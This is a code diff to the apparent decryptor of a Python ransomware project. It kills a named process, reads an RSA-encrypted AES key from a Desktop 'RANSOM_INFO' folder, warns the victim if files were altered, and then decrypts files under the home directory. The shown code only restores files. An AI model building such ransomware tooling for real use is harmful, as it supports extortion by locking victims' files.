@@ -9,8 +9,6 @@ import time
 #significant help on getting AES encryption to work from
 #https://github.com/the-javapocalypse/Python-File-Encryptor/blob/master/script.py
 
-def pad(s):
-    return s + b"\0" * (AES.block_size - len(s) % AES.block_size)
 
 def decrypt(ciphertext, key):
         iv = ciphertext[:AES.block_size]
@@ -56,16 +54,18 @@ def main():
         if proc.name() == PROCNAME:
             proc.kill()
 
-    home = expanduser('~')
-    info_dir = home + '/Desktop/INFO'
+    home = os.environ['HOME']
+    
+    info_dir = os.path.join(home, 'Desktop', 'RANSOM_INFO')
+                            
     if not os.path.exists(info_dir) or not os.path.exists(info_dir + "/encryptedKey.txt"):
         print("Unfortunately, YOU altered files... The decryption process will no longer work.")
         sys.exit()
-    f = open (info_dir + "/encryptedKey.txt", 'r')
+    f = open (os.path.join(info_dir, "encryptedKey.txt"), 'r')
     enc_aes_key = f.read()
     f.close()
 
-    dec_aes_key = rsa_key.decrypt(ast.literal_eval(str(enc_aes_key)))
+    dec_aes_key = rsa_key.decrypt(ast.literal_eval(enc_aes_key))
 
     #start from the home directory, pass it to the traverse function
     home = expanduser('~')
